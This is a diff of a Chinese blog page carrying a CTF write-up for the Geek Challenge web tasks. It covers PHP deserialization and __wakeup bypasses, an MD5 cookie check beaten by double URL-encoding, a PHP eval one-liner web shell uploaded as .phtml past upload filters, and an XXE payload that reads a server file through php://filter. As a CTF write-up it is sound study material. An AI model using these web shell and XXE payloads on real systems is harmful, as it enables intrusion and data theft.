@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="下面开始Syc的极客大挑战的writeup由于本校的网站即将关闭，因而以下不给出链接了1.打比赛前先撸一只猫">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-11-08T12:32:40.015Z">
+<meta property="og:updated_time" content="2019-11-20T06:15:11.624Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="geek-challenges">
 <meta name="twitter:description" content="下面开始Syc的极客大挑战的writeup由于本校的网站即将关闭，因而以下不给出链接了1.打比赛前先撸一只猫">
@@ -196,6 +196,19 @@
 
 <p>查看源代码，发现又是一个关于序列化漏洞的题。所谓序列化漏洞是指构造序列化的字符串后会触发魔术方法或者称为魔术函数的自动执行。这可能是程序本身不想看到的结果。其中魔术方法就包括toString(),<strong>construct(),以及</strong>destruct()方法。其中con和de是相反的两个，前面那个是对象建立时会自动调用，后面那个是对象销毁时会自动调用。这里我在构造了与之前的题一样的类的序列化后，发现绕不过，没有满足条件，主要是test.php中定义的变量为私有类，在这里采用同样的方法不行了。在百度了各种资料后，主要搜索关于序列化的漏洞，在这里面发现了几个特别的方法，payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这里使用直接构造的payload不行，其中Name后面的参数代表构造里面变量的数量，privete的参数被序列化后应当添加\00类名，public的序列化不变，protected的参数需要添加\00*\00类名。在class.php中有个__weakup需要绕过，需要将成员属性修改大于实际数目即可绕过。为什么要绕过__wakeup()方法呢，因为它会在unserialize()时会自动调用这个方法，而题目的index.php就调用了。因而它会最先被调用，那么username就变成了guest。为了构造admin那么必须绕过它。最后拿下flag.</span><br><span class="line"></span><br><span class="line">13.你有初恋吗</span><br><span class="line">&amp;emsp;&amp;emsp;页面上面提示了Hash，要Hash出同样的感觉。查看源代码又是一个代码审计题：</span><br><span class="line">```$adore=&apos;***************&apos;;</span><br><span class="line">$now = $_POST[&apos;lover&apos;];</span><br><span class="line">setcookie(&quot;Heart&quot;, md5($adore.&apos;syclover&apos;));</span><br><span class="line">if(isset($now)&amp;&amp;$now!=syclover) &#123;</span><br><span class="line">	if($_COOKIE[&apos;Heart&apos;] === md5($adore. urldecode($now)))&#123;</span><br><span class="line">		die ($flag);</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			die(&apos;I do not love you! You are not in my heart!&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
 <p>可以看到，绕过很简单，由于会自动urldecode一次，故将syclover两次urldecode就可以了。最后post提交拿下flag</p>
+<p>以下下均为自己没有做出来的题，然后看了答案复现一波</p>
+<p>1.你有特洛伊木马吗<br>&emsp;&emsp;这道题其实很清楚了就是上传一个一句话木马就可以拿到flag,奈何我之前怎么搞都上传不了。忘记了一个判断一句话木马的几个过滤条件：<br>一般会检测文件名后缀，以及检测PHP起始符(&lt;?),检测content-type的文件类型，并且检测文件头是否是图片的文件头。<br>知道了这四个要求起始就比较容易了，文件内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;cl4y&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件后缀采用.phtml现在去试试能否获得flag.<br>按理是可以获得flag的可能是由于环境问题导致没有得到flag,继续下一题复现。</p>
+<p>2.性感黄阿姨，在线聊天 –笑<br>&emsp;&emsp;发送flag过去，提示：我很想告诉你的，可惜你只是我的guest<br>抓包后可以看到name的value是guest,改为admin后，提示：</p>
+<figure class="highlight plain"><figcaption><span>flag in ./_f14g_Is_Here_.php ,try ro read it!"&#125;```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里可以直接用弱类型绕过，因为是双等号，直接用Intruder进行爆破，可以得到当name为357时候会提示flag in ./_f14g_ls_Here_.php</span><br><span class="line">然后让我们尝试去读它，在请求数据包中可以看到数据传送方式是json，那么可以猜测xml后端可能也可以解析，修改Content-Type为xml，然后编写一段简单的xml代码：</span><br><span class="line">```&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">	&lt;root&gt;</span><br><span class="line">		&lt;name&gt;357&lt;/name&gt;</span><br><span class="line">		&lt;request&gt;flag&lt;/request&gt;</span><br><span class="line">	&lt;root/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在response中回显了可惜你只是我的357说明编写的xml也被直接执行了。<br>这里还可发现回显的地方就是name，因而下面在构造xml语句的时候，利用name的值来做相关操作。<br>接下来构造协议流语句读取php文件了，直接读取不出来./<em>f14g_ls_Here</em>.php.这里还有个考点，php文件中有特殊字符(如&lt;)让xml解析时出错了，需要借助php流读取，<br>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./_f14g_ls_Here_.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">	&lt;root&gt;</span><br><span class="line">		&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">		&lt;request&gt;flag&lt;/request&gt;</span><br><span class="line">	&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里还有一点需要注意，直接这样页面不会给出想要的回显，但是在SYSTEM这里换行就可以了，这里应该是个什么需要注意的地方，先记下来。这里我回去试过后发现了原因，在把payload粘贴进去时候有些代码过长会自动换行，而这里换行后，默认会多出一个空格，这里就在base64-encode这中间多了个空格导致整个xml语句出错。<br>复现拿到flag.</p>
+<p>3.</p>
 
       
 
@@ -289,11 +302,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/10/13/jk-challenges/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/10/15/JS-study/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          geek-challenges
+          JS-study
         
       </div>
     </a>
